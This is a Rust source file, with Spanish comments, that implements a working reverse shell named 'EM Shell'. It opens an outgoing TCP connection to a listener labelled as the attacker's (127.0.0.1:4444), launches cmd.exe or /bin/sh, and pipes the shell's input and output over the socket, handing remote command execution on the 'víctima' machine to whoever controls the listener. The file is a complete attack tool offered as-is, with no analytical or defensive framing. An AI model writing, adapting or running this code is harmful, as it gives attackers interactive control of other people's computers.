use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio, Child};

fn main() {
    let direccion_servidor = "127.0.0.1:4444";

    println!("[*] Iniciando EM Shell (Estructura 100% Modular)...");

    match iniciar_componente_red(direccion_servidor) {
        Ok(mut stream) => {
            println!("[+] Conexión de red establecida con el atacante.");
            
            if let Err(e) = gestionar_flujo_shell(&mut stream) {
                eprintln!("[-] Error controlado en el flujo del shell: {}", e);
            }
        }
        Err(e) => {
            eprintln!("[-] Error controlado al conectar la red: {}", e);
        }
    }
    println!("[*] EM Shell finalizado.");
}

/// Inicia la conexión de red (Socket TCP saliente)
fn iniciar_componente_red(ip_puerto: &str) -> io::Result<TcpStream> {
    println!("[*] Intentando conectar por socket TCP a {}...", ip_puerto);
    let stream = TcpStream::connect(ip_puerto)?;
    Ok(stream)
}

/// Spawnea el proceso del sistema operativo según la plataforma
fn levantar_proceso_sistema() -> io::Result<Child> {
    #[cfg(target_os = "windows")]
    let mut comando = Command::new("cmd.exe");
    
    #[cfg(not(target_os = "windows"))]
    let mut comando = Command::new("/bin/sh");

    comando.stdin(Stdio::piped())
           .stdout(Stdio::piped())
           .stderr(Stdio::piped());

    comando.spawn()
}

/// Separa y delega los flujos de datos
fn gestionar_flujo_shell(stream: &mut TcpStream) -> io::Result<()> {
    let mut proceso = levantar_proceso_sistema()?;

    // Extraemos las tuberías de entrada y salida del proceso
    let p_stdin = proceso.stdin.take()
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Error: Stdin no disponible"))?;
    let p_stdout = proceso.stdout.take()
        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Error: Stdout no disponible"))?;

    // Clonamos el canal de red para otorgar una copia independiente al hilo de entrada
    let stream_lectura = stream.try_clone()?;

    // LLAMADA AL MÉTODO 4: Se delega la recepción al hilo secundario pasándole sus recursos correspondientes
    std::thread::spawn(move || {
        let _ = transferir_red_a_proceso(stream_lectura, p_stdin);
    });

    // LLAMADA AL MÉTODO 5: El hilo principal ejecuta la transferencia inversa (salida del proceso a la red)
    transferir_proceso_a_red(p_stdout, stream)?;

    // Espera ordenada del proceso
    let _ = proceso.wait();
    Ok(())
}

/// Lee los comandos provenientes de la red y los inyecta en la entrada del proceso de la víctima
fn transferir_red_a_proceso<R: Read, W: Write>(mut fuente_red: R, mut destino_proceso: W) -> io::Result<()> {
    let mut buffer = [0; 1024];
    loop {
        match fuente_red.read(&mut buffer) {
            Ok(0) => break, // El atacante cerró la conexión remota
            Ok(n) => {
                if destino_proceso.write_all(&buffer[..n]).is_err() {
                    break;
                }
                let _ = destino_proceso.flush();
            }
            Err(_) => break,
        }
    }
    Ok(())
}

/// Lee las respuestas de la consola local y las envía de vuelta a través del socket de red
fn transferir_proceso_a_red<R: Read, W: Write>(mut fuente_proceso: R, mut destino_red: W) -> io::Result<()> {
    let mut buffer = [0; 1024];
    loop {
        match fuente_proceso.read(&mut buffer) {
            Ok(0) => break, // El proceso local (cmd/sh) se cerró (ej. comando 'exit')
            Ok(n) => {
                destino_red.write_all(&buffer[..n])?;
                let _ = destino_red.flush();
            }
            Err(_) => break,
        }
    }
    Ok(())
}